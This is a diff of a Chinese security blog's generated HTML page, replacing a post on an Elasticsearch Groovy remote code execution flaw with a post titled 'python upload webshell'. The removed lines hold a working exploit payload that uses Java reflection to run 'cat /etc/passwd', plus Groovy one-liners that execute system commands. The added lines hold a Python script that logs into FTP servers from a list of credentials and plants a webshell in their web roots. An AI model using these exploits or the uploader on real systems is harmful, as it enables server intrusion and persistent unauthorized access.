@@ -4,26 +4,23 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Elasticsearch Groovy 远程代码执行漏洞 | 随风&#39;S Blog</title>
+    <title>python upload webshell | 随风&#39;S Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="iswin">
     
 
     
-    <meta name="description" content="致谢首先感谢Wooyun社区lupin的对漏洞http://zone.wooyun.org/content/18894的分析
-漏洞利用0x1漏洞的成因是Groovy的白名单被绕过了，对常见的危险函数以及某些类做了限制，关于漏洞利用，我们只需要找到一个类能获取当前Class对象，这样的话也就是说可以用Java反射特性执行任意代码了，文中给出了java.lang.Math这个类，然后调用java.la">
+    <meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950__author__ = &apos;iswin&apos;import ftplibimport  osimport socketimport sysimport _threadRPATH=&amp;#123;&quot;wwwroot&quot;,&quot;web&quot;,&quot;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Elasticsearch Groovy 远程代码执行漏洞">
-<meta property="og:url" content="http://www.iswin.org/2015/03/04/Elasticsearch-Groovy-remote-code-execution/index.html">
+<meta property="og:title" content="python upload webshell">
+<meta property="og:url" content="http://www.iswin.org/2015/06/08/python-upload-webshell/index.html">
 <meta property="og:site_name" content="随风'S Blog">
-<meta property="og:description" content="致谢首先感谢Wooyun社区lupin的对漏洞http://zone.wooyun.org/content/18894的分析
-漏洞利用0x1漏洞的成因是Groovy的白名单被绕过了，对常见的危险函数以及某些类做了限制，关于漏洞利用，我们只需要找到一个类能获取当前Class对象，这样的话也就是说可以用Java反射特性执行任意代码了，文中给出了java.lang.Math这个类，然后调用java.la">
-<meta property="og:updated_time" content="2015-06-07T16:51:03.000Z">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950__author__ = &apos;iswin&apos;import ftplibimport  osimport socketimport sysimport _threadRPATH=&amp;#123;&quot;wwwroot&quot;,&quot;web&quot;,&quot;">
+<meta property="og:updated_time" content="2015-06-08T14:36:37.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Elasticsearch Groovy 远程代码执行漏洞">
-<meta name="twitter:description" content="致谢首先感谢Wooyun社区lupin的对漏洞http://zone.wooyun.org/content/18894的分析
-漏洞利用0x1漏洞的成因是Groovy的白名单被绕过了，对常见的危险函数以及某些类做了限制，关于漏洞利用，我们只需要找到一个类能获取当前Class对象，这样的话也就是说可以用Java反射特性执行任意代码了，文中给出了java.lang.Math这个类，然后调用java.la">
+<meta name="twitter:title" content="python upload webshell">
+<meta name="twitter:description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950__author__ = &apos;iswin&apos;import ftplibimport  osimport socketimport sysimport _threadRPATH=&amp;#123;&quot;wwwroot&quot;,&quot;web&quot;,&quot;">
 
     
     <link rel="alternative" href="/atom.xml" title="随风&#39;S Blog" type="application/atom+xml">
@@ -79,14 +76,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/03/04/Elasticsearch-Groovy-remote-code-execution/" title="Elasticsearch Groovy 远程代码执行漏洞" itemprop="url">Elasticsearch Groovy 远程代码执行漏洞</a>
+      <a href="/2015/06/08/python-upload-webshell/" title="python upload webshell" itemprop="url">python upload webshell</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="iswin" target="_blank" itemprop="author">iswin</a>
 		
   <p class="article-time">
-    <time datetime="2015-03-04T14:57:34.000Z" itemprop="datePublished"> 发表于 2015-03-04</time>
+    <time datetime="2015-06-08T14:35:43.000Z" itemprop="datePublished"> 发表于 2015-06-08</time>
     
   </p>
 </header>
@@ -95,30 +92,25 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#致谢"><span class="toc-number">1.</span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用0x1"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用0x1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用0x2"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用0x2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+			
 		
 		</div>
 		
-		<h3 id="致谢">致谢</h3><p>首先感谢Wooyun社区<em>lupin</em>的对漏洞<a href="http://zone.wooyun.org/content/18894" target="_blank" rel="external">http://zone.wooyun.org/content/18894</a>的分析</p>
-<h3 id="漏洞利用0x1">漏洞利用0x1</h3><p>漏洞的成因是Groovy的白名单被绕过了，对常见的危险函数以及某些类做了限制，关于漏洞利用，我们只需要找到一个类能获取当前Class对象，这样的话也就是说可以用Java反射特性执行任意代码了，文中给出了<code>java.lang.Math</code>这个类，然后调用<code>java.lang.Math.class.forName(&#39;xx)</code>就可以执行Java代码了，这里我给出了一个命令执行的Exploit<br><a id="more"></a></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"size"</span>:<span class="number">1</span>,<span class="string">"script_fields"</span>: &#123;<span class="string">"iswin"</span>: &#123;<span class="string">"script"</span>:<span class="string">"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()"</span>,<span class="string">"lang"</span>: <span class="string">"groovy"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="漏洞利用0x2">漏洞利用0x2</h3><p>上面的方法是利用java的反射特性来利用漏洞，这里既然是Groovy语言的远程代码执行，首先需要对Groovy语言有一点简单的认识。</p>
-<blockquote>
-<p>Groovy 是 JVM 的一个替代语言 —替代 是指可以用 Groovy 在 Java 平台上进行 Java 编程，使用方式基本与使用 Java 代码的方式相同。在编写新应用程序时，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。<br>Groovy 与 Java 语言的区别很大，Java 语言是一种固定类型语言。在 Groovy 中，类型是可选的，所以您不必输入 String myStr = “Hello”; 来声明 String 变量。<br>除此之外，Groovy 代码还能在运行时轻松地改变自己。这实际上意味着，能够在运行时轻松地为对象指定新方法和属性。</p>
-</blockquote>
-<p>也就是说Groovy有自己的语法规则，通过查询Groovy的相关API，发现就执行命令来说Groovy的String对象中有个<code>execute()</code>方法可以执行系统命令，也就是说如果我们能找到一个可以控制的String类型的变量，就可以执行任意命令了，很遗憾，如果直接<code>&quot;ipconfig&quot;.execute()</code>这样就触发了Groovy的的黑名单。<br>如果用反射，可以这样<code>this.class.toString().valueOf(&#39;whoami&#39;).execute().getText()</code>，即可完美实现，但是同过查阅<code>valueOf()</code>这个函数，发现只要是String类型的变量即可调用，通过查阅API发现Groovy的<code>dump()</code>函数返回类型是String，所以完美的远程命令执行Exploit就出来了<code>dump().valueOf(&#39;ifconfig&#39;).execute().text</code>。</p>
-<h3 id="参考链接">参考链接</h3><p>  [1] :<a href="http://www.ibm.com/developerworks/cn/education/java/j-groovy/j-groovy.html" target="_blank" rel="external">http://www.ibm.com/developerworks/cn/education/java/j-groovy/j-groovy.html</a></p>
-<p>  [2] :<a href="http://zone.wooyun.org/content/18894" target="_blank" rel="external">http://zone.wooyun.org/content/18894</a></p>
-  
+		<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">__author__ = <span class="string">'iswin'</span></span><br><span class="line"><span class="keyword">import</span> ftplib</span><br><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line">RPATH=&#123;<span class="string">"wwwroot"</span>,<span class="string">"web"</span>,<span class="string">"www"</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(host,username,password,file)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ftp=ftplib.FTP(host=host,timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Error!"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    print(<span class="string">"Connect to host %s"</span>%host)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ftp.login(user=username,passwd=password)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Login Error!"</span>)</span><br><span class="line">        ftp.quit();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    print(<span class="string">"Connect successful!"</span>)</span><br><span class="line">    <span class="keyword">for</span> dir <span class="keyword">in</span> RPATH:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ftp.cwd(dir)</span><br><span class="line">            fd=open(file,<span class="string">"rb"</span>)</span><br><span class="line">            ftp.storbinary(<span class="string">'STOR %s'</span>%os.path.basename(file),fd)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"can't upload the file %s"</span>%file)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"upload %s to %s successful"</span>%(file,host))</span><br><span class="line">            ftp.quit()</span><br><span class="line">            fd.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            fd.close()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)&lt;<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">"usage:python shell.py ftplist shellpath"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    ftplist=sys.argv[<span class="number">1</span>]</span><br><span class="line">    shellpath=sys.argv[<span class="number">2</span>]</span><br><span class="line">    file=open(ftplist)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        line=file.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            username=line.split(<span class="string">","</span>)</span><br><span class="line">            upload(username[<span class="number">0</span>],username[<span class="number">1</span>],username[<span class="number">2</span>],shellpath)</span><br><span class="line">            print(<span class="string">"host:%s username:%s password:%s"</span>%(username[<span class="number">0</span>],username[<span class="number">1</span>],username[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/JAVA/">JAVA</a>
+  <a class="article-category-link" href="/categories/Python/">Python</a>
 </div>
 
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/Python/">Python</a>
+  </div>
 
 </div>
 
@@ -126,7 +118,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://www.iswin.org/2015/03/04/Elasticsearch-Groovy-remote-code-execution/" data-title="Elasticsearch Groovy 远程代码执行漏洞 | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
+	  <div data-url="http://www.iswin.org/2015/06/08/python-upload-webshell/" data-title="python upload webshell | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -139,19 +131,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2015/06/08/python-upload-webshell/" title="python upload webshell">
-  <strong>上一篇：</strong><br/>
-  <span>
-  python upload webshell</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/03/04/org-hibernate-HibernateException-Could-not-obtain-transaction-synchronized-Session-for-current-thread/"  title="org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread">
+<a href="/2015/03/04/Elasticsearch-Groovy-remote-code-execution/"  title="Elasticsearch Groovy 远程代码执行漏洞">
  <strong>下一篇：</strong><br/> 
- <span>org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread
+ <span>Elasticsearch Groovy 远程代码执行漏洞
 </span>
 </a>
 </div>
@@ -160,7 +144,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/03/04/Elasticsearch-Groovy-remote-code-execution/" data-title="Elasticsearch Groovy 远程代码执行漏洞" data-url="http://www.iswin.org/2015/03/04/Elasticsearch-Groovy-remote-code-execution/"></div>
+	<div class="ds-thread" data-thread-key="2015/06/08/python-upload-webshell/" data-title="python upload webshell" data-url="http://www.iswin.org/2015/06/08/python-upload-webshell/"></div>
 </section>
 
 
@@ -170,7 +154,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#致谢"><span class="toc-number">1.</span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用0x1"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用0x1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用0x2"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用0x2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+ 
  
   </div>
 
